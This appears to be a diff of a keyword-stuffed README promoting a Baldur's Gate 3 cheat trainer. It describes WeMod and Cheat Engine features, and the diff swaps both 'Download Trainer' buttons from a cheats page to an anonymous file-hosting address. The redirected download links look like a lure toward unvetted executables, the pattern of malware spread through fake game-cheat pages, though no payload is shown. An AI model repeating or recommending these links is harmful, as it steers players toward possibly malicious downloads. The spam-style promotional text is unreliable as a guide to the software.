@@ -4,13 +4,13 @@
 
 A gamer-friendly walkthrough to BG3 trainers—features, install steps, safety talk, and system needs—served with comparisons, slang, and zero grind.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/baldurs-gate-3)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload13.bitbucket.io)
 
 ## Product Description
 
 A **trainer** is a tiny program that hooks into Baldur’s Gate 3 at runtime, letting you toggle wild perks like God Mode, Infinite Actions, or Auto-Success rolls. WeMod’s one-click UI gives you 25-plus switches including health, gold and carry weight cheats , while community-made Cheat Engine tables stack more granular tweaks—think per-ally HP locks, split-stack exploits, and XP blasts . Console-style commands via Script Extender can summon any item UUID in a flash .
 
-[![Download Trainer](https://wotpack.ru/wp-content/uploads/2023/08/6-2.jpg)](https://wecheaters.github.io/cheats/baldurs-gate-3)
+[![Download Trainer](https://wotpack.ru/wp-content/uploads/2023/08/6-2.jpg)](https://fileoffload13.bitbucket.io)
 
 ## Features 🚀
 
@@ -56,3 +56,4 @@ With the right trainer, Baldur’s Gate 3 turns into a playground where every ro
 ## Keywords
 
 Baldur’s Gate 3 trainer, BG3 god mode, unlimited gold cheat, easy dice rolls, infinite actions, WeMod BG3, Cheat Engine BG3 table, Script Extender commands, BG3 mod menu, Baldur’s Gate 3 hacks, trainer install guide, system requirements BG3.
+
